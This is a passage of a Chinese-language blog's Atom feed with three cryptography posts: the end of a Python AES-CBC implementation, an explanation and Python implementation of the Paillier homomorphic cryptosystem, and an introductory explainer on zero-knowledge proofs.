class="number">0x4D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x2F</span>, <span class="number">0x5E</span>, <span class="number">0xBC</span>, <span class="number">0x63</span>, <span class="number">0xC6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6A</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0xB3</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0xEF</span>, <span class="number">0xC5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">round_keys = [[<span class="number">0</span>] * <span class="number">4</span>] * <span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xtime</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_string_to_matrix</span><span class="params">(string)</span>:</span></span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        byte = ord(string[i])</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            matrix.append([byte])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            matrix[i / <span class="number">4</span>].append(byte)</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_matrix_to_string</span><span class="params">(matrix)</span>:</span></span><br><span class="line">    string = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            string += chr(matrix[i][j])</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_round_keys</span><span class="params">(master_key)</span>:</span></span><br><span class="line">    round_keys[:<span class="number">4</span>] = convert_string_to_matrix(master_key)</span><br><span class="line">    <span class="comment"># print round_keys</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">4</span> * <span class="number">11</span>):</span><br><span class="line">        temp = []</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print round_keys[i - 4][0]</span></span><br><span class="line">            <span class="comment"># print round_keys[i - 1][0]</span></span><br><span class="line">            <span class="comment"># print Rcon[i/4]</span></span><br><span class="line">            byte = round_keys[i - <span class="number">4</span>][<span class="number">0</span>] ^ S[round_keys[i - <span class="number">1</span>][<span class="number">1</span>]] ^ Rcon[i / <span class="number">4</span>]</span><br><span class="line">            <span class="comment"># print i, byte</span></span><br><span class="line">            temp.append(byte)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">                byte = round_keys[i - <span class="number">4</span>][j] ^ S[round_keys[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">4</span>]]</span><br><span class="line">                <span class="comment"># print byte</span></span><br><span class="line">                temp.append(byte)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                byte = round_keys[i - <span class="number">4</span>][j] ^ round_keys[i - <span class="number">1</span>][j]</span><br><span class="line">                temp.append(byte)</span><br><span class="line">        round_keys[i] = temp</span><br><span class="line">    <span class="comment"># print round_keys</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_round_key</span><span class="params">(matrix, round_key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            matrix[i][j] ^= round_key[i][j]</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_bytes</span><span class="params">(matrix, table)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            matrix[i][j] = table[matrix[i][j]]</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift_single_row</span><span class="params">(matrix, line, n)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        temp = matrix[<span class="number">0</span>][line]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            matrix[j][line] = matrix[j + <span class="number">1</span>][line]</span><br><span class="line">        matrix[<span class="number">3</span>][line] = temp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift_rows</span><span class="params">(matrix, inversed=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> inversed == <span class="keyword">True</span>:</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        matrix = shift_single_row(matrix, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mix_single_column</span><span class="params">(matrix)</span>:</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        t ^= matrix[i]</span><br><span class="line">    <span class="comment"># print 'x =&gt;', t</span></span><br><span class="line">    temp = matrix[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        matrix[i] ^= t ^ xtime(matrix[i] ^ matrix[i + <span class="number">1</span>])</span><br><span class="line">    matrix[<span class="number">3</span>] ^= t ^ xtime(matrix[<span class="number">3</span>] ^ temp)</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mix_columns</span><span class="params">(matrix, inversed=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> inversed == <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            u = xtime(xtime(matrix[i][<span class="number">0</span>] ^ matrix[i][<span class="number">2</span>]))</span><br><span class="line">            v = xtime(xtime(matrix[i][<span class="number">1</span>] ^ matrix[i][<span class="number">3</span>]))</span><br><span class="line">            matrix[i][<span class="number">0</span>] ^= u</span><br><span class="line">            matrix[i][<span class="number">1</span>] ^= v</span><br><span class="line">            matrix[i][<span class="number">2</span>] ^= u</span><br><span class="line">            matrix[i][<span class="number">3</span>] ^= v</span><br><span class="line">        matrix = mix_columns(matrix)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="comment"># print 'm =&gt;', matrix[i]</span></span><br><span class="line">            matrix[i] = mix_single_column(matrix[i])</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cipher</span><span class="params">(block, rounds, choice)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(block) != <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Block\'s length must be 16."</span>)</span><br><span class="line">    matrix = convert_string_to_matrix(block)</span><br><span class="line">    <span class="keyword">if</span> choice == ENCRYPT:</span><br><span class="line">        matrix = add_round_key(matrix, round_keys[:<span class="number">4</span>])</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; rounds:</span><br><span class="line">            matrix = sub_bytes(matrix, S)</span><br><span class="line">            matrix = shift_rows(matrix)</span><br><span class="line">            matrix = mix_columns(matrix)</span><br><span class="line">            matrix = add_round_key(matrix, round_keys[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        matrix = sub_bytes(matrix, S)</span><br><span class="line">        matrix = shift_rows(matrix)</span><br><span class="line">        matrix = add_round_key(matrix, round_keys[<span class="number">40</span>:])</span><br><span class="line">    <span class="keyword">elif</span> choice == DECRYPT:</span><br><span class="line">        matrix = add_round_key(matrix, round_keys[<span class="number">40</span>:])</span><br><span class="line">        matrix = shift_rows(matrix, inversed=<span class="keyword">True</span>)</span><br><span class="line">        matrix = sub_bytes(matrix, S_)</span><br><span class="line">        i = rounds - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            matrix = add_round_key(matrix, round_keys[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>])</span><br><span class="line">            matrix = mix_columns(matrix, inversed=<span class="keyword">True</span>)</span><br><span class="line">            matrix = shift_rows(matrix, inversed=<span class="keyword">True</span>)</span><br><span class="line">            matrix = sub_bytes(matrix, S_)</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        matrix = add_round_key(matrix, round_keys[:<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> convert_matrix_to_string(matrix)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cipher</span><span class="params">(data, key, iv, rounds, choice)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(data) % BLOCK_SIZE != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Data length illegal."</span>)</span><br><span class="line">    <span class="keyword">if</span> len(key) != <span class="number">16</span> <span class="keyword">or</span> len(iv) != <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"key/iv\'s length should be 16."</span>)</span><br><span class="line">    generate_round_keys(key)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(data):</span><br><span class="line">        block = data[i:i + <span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> choice == ENCRYPT:</span><br><span class="line">            block = list(map(<span class="keyword">lambda</span> x, y: ord(x) ^ ord(y), block, iv))</span><br><span class="line">            block = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> block])</span><br><span class="line">            block = aes_cipher(block, rounds, choice)</span><br><span class="line">            iv = block</span><br><span class="line">        <span class="keyword">elif</span> choice == DECRYPT:</span><br><span class="line">            temp = block[:]</span><br><span class="line">            block = aes_cipher(block, rounds, choice)</span><br><span class="line">            block = list(map(<span class="keyword">lambda</span> x, y: ord(x) ^ ord(y), block, iv))</span><br><span class="line">            block = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> block])</span><br><span class="line">            iv = temp</span><br><span class="line">        result.append(block)</span><br><span class="line">        i += BLOCK_SIZE</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    key = <span class="string">'#qianfei12345678'</span></span><br><span class="line">    iv = <span class="string">'0'</span> * <span class="number">16</span></span><br><span class="line">    ciphertext = cipher(<span class="string">'#qianfei12345678'</span>, key, iv, <span class="number">10</span>, ENCRYPT)</span><br><span class="line">    <span class="keyword">print</span> ciphertext</span><br><span class="line">    plaintext = cipher(ciphertext, key, iv, <span class="number">10</span>, DECRYPT)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Data_Encryption_Standard</a><br><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard</a><br><a href="https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf" target="_blank" rel="noopener">https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/76124722" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/76124722</a><br><a href="https://github.com/twhiteman/pyDes/blob/master/pyDes.py" target="_blank" rel="noopener">https://github.com/twhiteman/pyDes/blob/master/pyDes.py</a><br><a href="https://en.wikipedia.org/wiki/Triple_DES" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Triple_DES</a><br><a href="http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/" target="_blank" rel="noopener">http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/</a><br><a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" rel="noopener">https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf</a><br><a href="https://www.cxyxiaowu.com/3239.html" target="_blank" rel="noopener">https://www.cxyxiaowu.com/3239.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
      <category term="python" scheme="blog.b3ale.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python实现Paillier加密解密算法</title>
    <link href="blog.b3ale.cn/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>blog.b3ale.cn/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-10-24T03:49:26.000Z</published>
    <updated>2019-10-25T10:57:15.763Z</updated>
    
    <content type="html"><![CDATA[<p>Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h2><p>首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。</p><p>然后根据卡迈克尔函数计算私钥 $\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。</p><h2 id="Encipher"><a href="#Encipher" class="headerlink" title="Encipher"></a>Encipher</h2><p>加密时取一个随机数 $r$，计算出 $c \equiv g^m r^n(mod\ n^2)$。</p><h2 id="Decipher"><a href="#Decipher" class="headerlink" title="Decipher"></a>Decipher</h2><p>解密有一点复杂。首先我们可以得到：</p><p>$$<br>c^\lambda \equiv (g^m r^n)^\lambda \equiv g^{m \lambda} r^{n \lambda}(mod\ n^2)<br>$$</p><p>根据卡迈克尔函数，即对于任何 $\omega \in Z^*_{n^2}$，必定存在以下结论：</p><p>$$<br>\omega^{n \lambda} \equiv 1(mod\ n^2)<br>$$</p><p>那么可以得到 $c^\lambda \equiv g^{m \lambda}(mod\ n^2)$。</p><p>然后看看生成元 $g$，实际上是通过 $g=(1+\alpha n)\beta^n$ 得到的，并且 $\alpha,\beta \in Z^*_n$。由此可得：</p><p>$$<br>c^\lambda \equiv (1+\alpha n)^{m \lambda}\beta^{n m \lambda} \equiv (1+\alpha n)^{m \lambda}(mod\ n^2)<br>$$</p><p>再根据公式 $(1+n)^x \equiv 1+xn(mod\ n^2)$，可以得到：</p><p>$$<br>c^\lambda \equiv (1+n)^{\alpha m \lambda} \equiv 1+n \alpha m \lambda(mod\ n^2)<br>$$</p><p>然后我们在此处定义一个函数 $L(x)=\frac{x-1}{n}$，则 $L(c^\lambda)=\alpha m \lambda$。</p><p>那么我们可以得到明文的计算公式为 $m \equiv \frac{L(c^\lambda)}{L(g^\lambda)} \equiv \frac{\alpha m \lambda}{\alpha \lambda} \equiv m(mod\ n)$。</p><h1 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h1><p>通过 gmpy2 和 libnum 库实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) / n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    lmd = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#g = random.randint(1, n ** 2)</span></span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] g is not good enough'</span></span><br><span class="line">        exit()</span><br><span class="line">    pk = [n, g]</span><br><span class="line">    sk = lmd</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encipher</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    n, g = pk</span><br><span class="line">    r = random.randint(<span class="number">1</span>, n ** <span class="number">2</span>)</span><br><span class="line">    c = gmpy2.powmod(g, m, n ** <span class="number">2</span>) * gmpy2.powmod(r, n, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    <span class="comment">#print 'pk:', pk</span></span><br><span class="line">    <span class="comment">#print 'sk:', sk</span></span><br><span class="line">    plaintext = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encipher(plaintext, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Ciphertext:'</span>, ciphertext</span><br><span class="line">    plaintext = decipher(ciphertext, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Plaintext:'</span>, plaintext</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://security.hsr.ch/msevote/docs/Paillier_Cryptosystem.pdf" target="_blank" rel="noopener">The Paillier Cryptosystem</a><br><a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E9%82%81%E5%85%8B%E7%88%BE%E5%87%BD%E6%95%B8" target="_blank" rel="noopener">卡迈克尔函数</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
      <category term="python" scheme="blog.b3ale.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>何为零知识证明</title>
    <link href="blog.b3ale.cn/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"/>
    <id>blog.b3ale.cn/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/</id>
    <published>2019-09-29T11:28:12.000Z</published>
    <updated>2019-10-04T10:33:07.438Z</updated>
    
    <content type="html"><![CDATA[<p>何为<a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a>？</p><a id="more"></a><p>零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。</p><h1 id="童话里的零知识证明"><a href="#童话里的零知识证明" class="headerlink" title="童话里的零知识证明"></a>童话里的零知识证明</h1><p>举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。</p><p>阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」</p><p>这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。</p><h1 id="零知识证明的优点"><a href="#零知识证明的优点" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ul><li>在使用零知识证明的时候，不降低安全性。</li><li>零知识证明工作高效，计算过程量小，双方交换信息少。</li><li>既安全、又有良好的隐私、又减少计算量。</li></ul><h1 id="零知识证明的性质"><a href="#零知识证明的性质" class="headerlink" title="零知识证明的性质"></a>零知识证明的性质</h1><p>根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质：</p><ol><li>完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。</li><li>合理性（soundness）：没有人能够假冒证明方，使这个证明成功。</li><li>零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。</li></ol><h1 id="零知识证明的优点-1"><a href="#零知识证明的优点-1" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ol><li>随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。</li><li>高效性。该过程计算量小，双方交换的信息量少。</li><li>安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。</li><li>许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。</li></ol><h1 id="证明举例"><a href="#证明举例" class="headerlink" title="证明举例"></a>证明举例</h1><p>例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法：</p><ol><li>A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。</li><li>B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 B，从而证明自己确实拥有该房间的钥匙。</li></ol><p>后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p>例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法：</p><ol><li>B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。</li><li>A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。</li></ol><p>后面的方法属于零知识证明。</p><p>有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。</p><h1 id="零知识证明一般的过程"><a href="#零知识证明一般的过程" class="headerlink" title="零知识证明一般的过程"></a>零知识证明一般的过程</h1><p>假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始：</p><ol><li>甲方先发送满足条件的随机值给乙方，这个称为承诺。</li><li>乙方发送满足条件的随机值给甲方，这个称为挑战。</li><li>甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。</li><li>乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。</li></ol><p>如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/3f524c925c34" target="_blank" rel="noopener">https://www.jianshu.com/p/3f524c925c34</a><br><a href="https://blog.csdn.net/liudongdong19/article/details/82884742" target="_blank" rel="noopener">https://blog.csdn.net/liudongdong19/article/details/82884742</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;何为&lt;a href=&quot;https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;零知识证明&lt;/a&gt;？&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blockchain" scheme="blog.b3ale.cn/tags/blockchain/"/>
    
  </entry>
  
</feed>
